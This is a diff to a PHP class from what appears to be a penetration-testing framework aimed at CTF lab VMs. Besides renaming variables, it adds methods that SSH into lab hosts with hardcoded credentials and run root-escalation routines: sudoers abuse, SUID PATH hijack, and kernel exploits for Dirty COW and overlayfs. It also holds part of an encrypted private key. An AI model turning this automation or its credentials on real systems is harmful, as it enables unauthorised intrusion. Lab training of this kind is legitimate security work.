@@ -38,19 +38,19 @@ class poc4lan extends poc4web {
         $ip = $this->k2; // k2
         $port = "22";
         $protocol = "T";
-        $user_name_created = "user" ;
-        $user_name_pass = "password";
+        $login = "user" ;
+        $pass = "password";
         
         $ip = "10.60.10.135"; // Cyberry
         $port = "22";
         $protocol = "T";
         
-        $user_name_created = "root" ;
-        $user_name_pass = "chewbacabemerry";
-        $user_name_created = "mary" ;
-        $user_name_pass = "bakeoff";
-        $user_name_created = "nick" ;
-        $user_name_pass = "custodio";
+        $login = "root" ;
+        $pass = "chewbacabemerry";
+        $login = "mary" ;
+        $pass = "bakeoff";
+        $login = "nick" ;
+        $pass = "custodio";
         
         
         $login = "";
@@ -64,6 +64,7 @@ class poc4lan extends poc4web {
     
     
     public function poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm){
+        $this->start(__FUNCTION__, $titre);
         $this->gtitre(__FUNCTION__);
         
         $eth = trim($eth);
@@ -96,7 +97,7 @@ class poc4lan extends poc4web {
             $templateB64_cmd = base64_encode($template_cmd);
             $templateB64_shell = base64_encode($template_shell);
             
-            $data = "/usr/bin/id";
+            $data = "id";
             $rst_id = $test->stream4result($stream, $data, 10);
             list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $test->parse4id($rst_id);
             $this->article("CREATE Template ID", $template_id);
@@ -120,14 +121,14 @@ class poc4lan extends poc4web {
         $ip = $this->k2; // k2
         $port = "22";
         $protocol = "T";
-        $user_name_created = "user" ;
-        $user_name_pass = "password";
+        $login = "user" ;
+        $pass = "password";
         
         $ip = "10.60.10.137"; // DC-1 OK 
         $port = "22";
         $protocol = "T";
-        $user_name_created = "flag4" ;
-        $user_name_pass = "orange";
+        $login = "flag4" ;
+        $pass = "orange";
         
         $login = "";
         $pass = "";
@@ -151,10 +152,10 @@ class poc4lan extends poc4web {
         $ip = "10.60.10.141"; // DC-2
         $port = "7744";
         $protocol = "T";
-        $user_name_created = "jerry" ;
-        $user_name_pass = "adipiscing";
-        $user_name_created = "tom" ;
-        $user_name_pass = "parturient";
+        $login = "jerry" ;
+        $pass = "adipiscing";
+        $login = "tom" ;
+        $pass = "parturient";
         
         $login = "";
         $pass = "";
@@ -167,6 +168,113 @@ class poc4lan extends poc4web {
     }
     
     
+    public function poc4root8users2sudoers8app2cmd2watch(){ //
+        $this->ssTitre(__FUNCTION__);
+        $eth = 'vmnet6';
+        $domain = 'hack.vlan';
+        
+        $ip = "10.60.10.177"; // rudra
+        $port = "22";
+        $protocol = "T";
+        
+        
+        $login = "sunset";
+        $pass = "cheer14";
+        $titre = "";
+        $fonction2exec = "users";
+        $vm = "";
+        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
+        
+    }
+ 
+    
+    public function poc4root8suids8env2path(){ // OK
+        $this->ssTitre(__FUNCTION__);
+        $eth = 'vmnet6';
+        $domain = 'hack.vlan';
+        
+        $ip = "10.60.10.159"; // Silky-CTF
+        $port = "22";
+        $protocol = "T";
+        $login = 'silky' ;
+        $pass = 's1lKy#5';
+
+        $titre = "";
+        $fonction2exec = "suids";
+        $suid = "/usr/bin/sky";
+        $vm = "";
+        $suid = "/usr/bin/sky";
+        $suid_call = "whoami";
+        $this->suids8env2path4add($suid,$suid_call);
+        
+        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
+        
+    }
+    
+    
+    public function poc4root8users2sudoers8app2cmd2strace(){ // OK
+        $this->ssTitre(__FUNCTION__);
+        $eth = 'vmnet6';
+        $domain = 'hack.vlan';
+        
+        $ip = "10.60.10.158"; // PumpkinRaising
+        $port = "22";
+        $protocol = "T";
+        $login = "jack" ;
+        $pass = "69507506099645486568";
+        $titre = "";
+        $fonction2exec = "users";
+        $vm = "";
+        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
+        
+    }
+    
+    
+
+    
+    public function poc4root8users2sudoers8app2cmd2all(){ // OK
+        $this->ssTitre(__FUNCTION__);
+        $eth = 'vmnet6';
+        $domain = 'hack.vlan';
+        
+        $ip = "10.60.10.160"; // W34kn3ss One
+        $port = "22";
+        $protocol = "T";
+        $login = 'n30' ;
+        $pass = 'dMASDNB!!#B!#!#33';
+        
+        $ip = "10.60.10.161"; // W1R3S
+        $port = "22";
+        $protocol = "T";
+        $login = 'w1r3s' ;
+        $pass = 'computer';
+        
+        
+        $titre = "";
+        $fonction2exec = "users";
+        $vm = "";
+        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
+        
+    }
+    
+    public function poc4root8users2sudoers8app2cmd2ed(){ // OK 
+        $this->ssTitre(__FUNCTION__);
+        $eth = 'vmnet6';
+        $domain = 'hack.vlan';
+
+        $ip = "10.60.10.176"; // sunset
+        $port = "22";
+        $protocol = "T";
+
+        
+        $login = "sunset";
+        $pass = "cheer14";
+        $titre = "";
+        $fonction2exec = "users";
+        $vm = "";
+        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
+        
+    }
     
     public function poc4root8users2sudoers8app2cmd2git(){
         $this->ssTitre(__FUNCTION__);
@@ -179,10 +287,10 @@ class poc4lan extends poc4web {
         $ip = "10.60.10.141"; // DC-2
         $port = "7744";
         $protocol = "T";
-        $user_name_created = "jerry" ;
-        $user_name_pass = "adipiscing";
-        $user_name_created = "tom" ;
-        $user_name_pass = "parturient";
+        $login = "jerry" ;
+        $pass = "adipiscing";
+        $login = "tom" ;
+        $pass = "parturient";
         
         $login = "";
         $pass = "";
@@ -223,8 +331,8 @@ class poc4lan extends poc4web {
         $ip = "10.60.10.139"; // Basic Penetration Testing Two
         $port = "22";
         $protocol = "T";
-        $user_name_created = "jan" ;
-        $user_name_pass = "armando";
+        $login = "jan" ;
+        $pass = "armando";
         
         $login = "";
         $pass = "";
@@ -244,13 +352,18 @@ class poc4lan extends poc4web {
         $ip = "10.60.10.139"; // Basic Penetration Testing Two
         $port = "22";
         $protocol = "T";
-        $user_name_created = "jan" ;
-        $user_name_pass = "armando";
+        $login = "jan" ;
+        $pass = "armando";
         
-        $login = "";
-        $pass = "";
+        
+        $ip = "10.60.10.162"; // Moria 1.1 OK 
+        $port = "22";
+        $protocol = "T";
+        $login = "Ori" ;
+        $pass = "spanky";
+        
         $titre = "";
-        $fonction2exec = "";
+        $fonction2exec = "misc2keys";
         $vm = "";
         $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
         
@@ -266,7 +379,7 @@ class poc4lan extends poc4web {
         $ip = "10.60.10.139"; // basic pentesting 2
         $port = "22";
         $protocol = "T";
-        $user_name_created = "kay" ;
+        $login = "kay" ;
         $private_key_str = "-----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75
@@ -343,19 +456,19 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $test->key2gen4public("", 10, $private_key_file, $public_key_file, $private_key_passwd);
         
         
-        $stream = $test->stream8ssh8key8public($test->ip, $test->port, $user_name_created, $public_key_file, $private_key_file, $private_key_passwd);
+        $stream = $test->stream8ssh8key8public($test->ip, $test->port, $login, $public_key_file, $private_key_file, $private_key_passwd);
         
-        $template_cmd = "ssh $user_name_created@$test->ip -p $test->port -i $private_key_file.pem -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -C  \"%CMD%\"";
-        list($stream,$template_cmd) = $test->stream4check($stream,$template_cmd,$user_name_created,$user_name_pass);
+        $template_cmd = "ssh $login@$test->ip -p $test->port -i $private_key_file.pem -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -C  \"%CMD%\"";
+        list($stream,$template_cmd) = $test->stream4check($stream,$template_cmd,$login,$pass);
         
         
-        //$stream = $test->stream8ssh2key8priv4str($test->ip, $test->port, $user_name_created,$private_key_str, $private_key_file, $private_key_passwd);
+        //$stream = $test->stream8ssh2key8priv4str($test->ip, $test->port, $login,$private_key_str, $private_key_file, $private_key_passwd);
         //$test->stream4root($stream);
         
         if (is_resource($stream)){
             //$test->openvas($ip);
             //var_dump($stream);echo get_resource_type($stream);$test->pause();
-            //$test->yesAUTH($test->ip, $test->port, $test->protocol, $user_name_created, $user_name_pass, "", "", "", "", "", __FUNCTION__, $test->ip2geoip());
+            //$test->yesAUTH($test->ip, $test->port, $test->protocol, $login, $pass, "", "", "", "", "", __FUNCTION__, $test->ip2geoip());
             $template_id = "%ID%";
             $templateB64_id = base64_encode($template_id);
             $templateB64_cmd = base64_encode($template_cmd);
@@ -372,8 +485,8 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
             $this->article("CREATE Template SHELL", $template_shell);
             $this->article("CREATE Template BASE64 SHELL", $templateB64_shell);
             
-            $user_name_pass = "";
-            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$user_name_pass);
+            $pass = "";
+            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$pass);
             $obj_lan->poc($test->flag_poc);
             
             
@@ -405,8 +518,8 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $ip = $this->k2; // k2
         $port = "22";
         $protocol = "T";
-        $user_name_created = "user" ;
-        $user_name_pass = "password";
+        $login = "user" ;
+        $pass = "password";
         
         $login = "";
         $pass = "";
@@ -461,8 +574,8 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $ip = "10.60.10.151"; // PumpkinGarden
         $port = "3535";
         $protocol = "T";
-        $user_name_created = 'scarecrow' ;
-        $user_name_pass = '5Qn@$y';
+        $login = 'scarecrow' ;
+        $pass = '5Qn@$y';
         
         
         $login = "";
@@ -484,8 +597,8 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $ip = "10.60.10.153"; // DeRKnStiNK
         $port = "22";
         $protocol = "T";
-        $user_name_created = "mrderp" ;
-        $user_name_pass = "derpderpderpderpderpderpderp";
+        $login = "mrderp" ;
+        $pass = "derpderpderpderpderpderpderp";
         
         
         $login = "";
@@ -508,8 +621,8 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $ip = "10.60.10.138"; // analoguepond
         $port = "22";
         $protocol = "T";
-        $user_name_created = "eric" ;
-        $user_name_pass = "therisingsun";
+        $login = "eric" ;
+        $pass = "therisingsun";
         
         
         $login = "";
@@ -532,8 +645,8 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $ip = "10.60.10.152"; // Lampiao
         $port = "22";
         $protocol = "T";
-        $user_name_created = "tiago" ;
-        $user_name_pass = "Virgulino";
+        $login = "tiago" ;
+        $pass = "Virgulino";
         
         $login = "";
         $pass = "";
@@ -545,6 +658,18 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         
     }
     
+    public function poc4root8exploit8kernel_40847_CVE_2016_5195(){ // OK
+        $this->ssTitre(__FUNCTION__);
+        $eth = 'vmnet6';
+        $domain = 'hack.vlan';
+                
+        $ip = "10.60.10.152"; // Lampio
+        $port = "1898";
+        $protocol = "T";
+        $web = "http://$ip:$port/";
+        $obj_web = new WEB($eth, $domain, $web);
+        $obj_web->web4pentest8cms();
+    }
     
     public function poc4root8exploit8kernel_37292_CVE_2015_1328(){ // OK
         $this->ssTitre(__FUNCTION__);
@@ -555,21 +680,21 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $ip = "10.60.10.147"; // OK typhoon 1.02 exploit_37292
         $port = "22";
         $protocol = "T";
-        $user_name_created = "typhoon" ;
-        $user_name_pass = "789456123";
+        $login = "typhoon" ;
+        $pass = "789456123";
         
         
         $ip = "10.60.10.148"; // OK Super Mario exploit_37292
         $port = "22";
         $protocol = "T";
-        $user_name_created = "luigi" ;
-        $user_name_pass = "luigi1";
+        $login = "luigi" ;
+        $pass = "luigi1";
         
         $ip = "10.60.10.149"; // OK SecOS 1 exploit_37292
         $port = "22";
         $protocol = "T";
-        $user_name_created = "spiderman" ;
-        $user_name_pass = "CrazyPassword!";
+        $login = "spiderman" ;
+        $pass = "CrazyPassword!";
         
         
         $login = "";
@@ -668,12 +793,12 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $port = "22";
         $protocol = "T";
         
-        $user_name_created = "susan" ;
-        $user_name_pass = "MySuperS3cretValue!";
-        $user_name_created = "insecurity" ;
-        $user_name_pass = "P@ssw0rd";
-        $user_name_created = "root" ;
-        $user_name_pass = "secret123";
+        $login = "susan" ;
+        $pass = "MySuperS3cretValue!";
+        $login = "insecurity" ;
+        $pass = "P@ssw0rd";
+        $login = "root" ;
+        $pass = "secret123";
         
         $login = "";
         $pass = "";
@@ -689,22 +814,29 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $this->ssTitre(__FUNCTION__);
         $eth = 'vmnet6';
         $domain = 'hack.vlan';
+        
         $ip = "10.60.10.133"; // Lin.Security v1.0
         $port = "22";
         $protocol = "T";
-        $user_name_created = "insecurity" ;
-        $user_name_pass = "P@ssw0rd";
-        $user_name_created = "root" ;
-        $user_name_pass = "secret123";
-        $user_name_created = "susan" ;
-        $user_name_pass = "MySuperS3cretValue!";
-        $user_name_created = "bob" ;
-        $user_name_pass = "secret";
+        $login = "insecurity" ;
+        $pass = "P@ssw0rd";
+        $login = "root" ;
+        $pass = "secret123";
+        $login = "susan" ;
+        $pass = "MySuperS3cretValue!";
+        $login = "bob" ;
+        $pass = "secret";
         
-        $login = "";
-        $pass = "";
+        $ip = "10.60.10.162"; // unknowndevice64  1
+        $port = "1337";
+        $protocol = "T";
+        $login = "ud64";
+        $pass = "1M!#64@ud";
+        
+        
+        
         $titre = "";
-        $fonction2exec = "";
+        $fonction2exec = "users";
         $vm = "";
         $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
         
@@ -719,8 +851,8 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $port = "22";
         $protocol = "T";
         
-        $user_name_created = "bob" ;
-        $user_name_pass = "secret";
+        $login = "bob" ;
+        $pass = "secret";
         
         $login = "";
         $pass = "";
@@ -741,8 +873,8 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $ip = "10.60.10.143"; // DC-6
         $port = "22";
         $protocol = "T";
-        $user_name_created = "graham" ;
-        $user_name_pass = "GSo7isUM1D4";
+        $login = "graham" ;
+        $pass = "GSo7isUM1D4";
         
         $login = "";
         $pass = "";
@@ -763,8 +895,8 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $ip = "10.60.10.142"; // DC-4
         $port = "22";
         $protocol = "T";
-        $user_name_created = "jim" ;
-        $user_name_pass = "jibril04";
+        $login = "jim" ;
+        $pass = "jibril04";
         
         $login = "";
         $pass = "";
@@ -786,8 +918,8 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $ip = $this->k2; // Cyberry
         $port = "22";
         $protocol = "T";
-        $user_name_created = "user" ;
-        $user_name_pass = "password";
+        $login = "user" ;
+        $pass = "password";
         
         $login = "";
         $pass = "";
